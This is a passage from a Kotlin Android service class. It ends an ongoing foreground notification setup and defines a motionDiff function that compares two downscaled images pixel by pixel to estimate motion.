                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setOngoing(true)
                    .build()
                startForegroundSafely(NOTIFICATION_ID, n)
            }
        } catch (_: Exception) { }
    }

    private fun motionDiff(a: ByteArray, b: ByteArray): Float {
        try {
            val ba = BitmapFactory.decodeByteArray(a, 0, a.size)
            val bb = BitmapFactory.decodeByteArray(b, 0, b.size) ?: return 0f
            if (ba == null) return 0f
            val scale = 32
            val sa = Bitmap.createScaledBitmap(ba, scale, scale, true)
            val sb = Bitmap.createScaledBitmap(bb, scale, scale, true)
            ba.recycle(); bb.recycle()
            val diffCount = (0 until scale * scale).count { i ->
                val x = i % scale; val y = i / scale
                val pa = sa.getPixel(x, y); val pb = sb.getPixel(x, y)
                val da = (pa shr 16 and 0xFF) + (pa shr 8 and 0xFF) + (pa and 0xFF)
                val db = (pb shr 16 and 0xFF) + (pb shr 8 and 0xFF) + (pb and 0xFF)
                kotlin.math.abs(da - db) > 90
            }
            sa.recycle(); sb.recycle()
            return diffCount.toFloat() / (scale * scale)
        } catch (_: Exception) { return 0f }
    }

    companion object {
        private const val NOTIFICATION_ID = 1001
    }
}
